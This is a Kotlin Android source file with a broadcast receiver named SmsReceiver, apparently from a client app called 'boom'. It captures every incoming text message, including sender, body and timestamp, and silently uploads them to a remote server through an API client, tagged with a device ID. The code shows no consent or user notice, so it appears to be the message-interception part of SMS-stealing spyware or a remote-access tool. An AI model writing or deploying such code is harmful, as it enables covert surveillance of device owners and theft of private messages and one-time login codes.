package com.boom.client.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.boom.client.api.ApiClient
import com.boom.client.utils.Prefs
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        Prefs.init(context)
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        val arr = JSONArray()
        for (msg in messages) {
            arr.put(JSONObject().apply {
                put("address", msg.displayOriginatingAddress)
                put("body", msg.messageBody)
                put("timestamp", msg.timestampMillis)
                put("threadId", "")
            })
        }
        if (arr.length() > 0) Thread { ApiClient.uploadSms(Prefs.deviceId, arr) }.start()
    }
}
